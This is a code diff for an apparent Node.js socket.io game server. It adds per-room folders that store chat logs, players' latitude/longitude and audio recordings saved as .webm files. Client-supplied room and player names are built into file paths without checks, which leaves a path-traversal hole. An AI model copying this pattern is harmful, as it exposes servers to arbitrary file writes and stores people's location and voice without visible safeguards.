@@ -1,8 +1,10 @@
+
 const express = require("express")
 const http = require("http")
 const { Server } = require("socket.io")
 const crypto = require("crypto")
 const fs = require("fs")
+const path = require("path")
 
 const app = express()
 
@@ -19,6 +21,31 @@ res.sendFile(__dirname + "/public/index.html")
 })
 
 const salas = {}
+
+function crearCarpetaSala(room){
+
+const ruta =
+path.join(__dirname,"partidas",room)
+
+if(!fs.existsSync("partidas")){
+
+fs.mkdirSync("partidas")
+
+}
+
+if(!fs.existsSync(ruta)){
+
+fs.mkdirSync(ruta)
+
+fs.mkdirSync(
+path.join(ruta,"audio")
+)
+
+}
+
+return ruta
+
+}
 
 io.on("connection",(socket)=>{
 
@@ -198,6 +225,7 @@ sala.turno == "X"
 io.to(data.room).emit(
 "turnUpdate",
 sala.turno
+
 )
 
 })
@@ -226,16 +254,13 @@ if(
 data.mensaje.length > 200
 ) return
 
-const log = {
-fecha:new Date(),
-sala:data.room,
-nombre:data.nombre,
-mensaje:data.mensaje
-}
+const ruta =
+crearCarpetaSala(data.room)
 
 fs.appendFileSync(
-"chatlogs.txt",
-JSON.stringify(log) + "\n"
+path.join(ruta,"chat.txt"),
+"[" + data.nombre + "] " +
+data.mensaje + "\n"
 )
 
 io.to(data.room).emit(
@@ -250,17 +275,31 @@ mensaje:data.mensaje
 
 socket.on("ubicacion",(data)=>{
 
-const log = {
-fecha:new Date(),
-sala:data.room,
-nombre:data.nombre,
-lat:data.lat,
-lng:data.lng
-}
+const ruta =
+crearCarpetaSala(data.room)
 
 fs.appendFileSync(
-"ubicaciones.txt",
-JSON.stringify(log) + "\n"
+path.join(ruta,"ubicacion.txt"),
+JSON.stringify(data) + "\n"
+)
+
+})
+
+socket.on("audio",(data)=>{
+
+const ruta =
+crearCarpetaSala(data.room)
+
+const archivo =
+path.join(
+ruta,
+"audio",
+data.nombre + ".webm"
+)
+
+fs.appendFileSync(
+archivo,
+Buffer.from(data.audio)
 )
 
 })
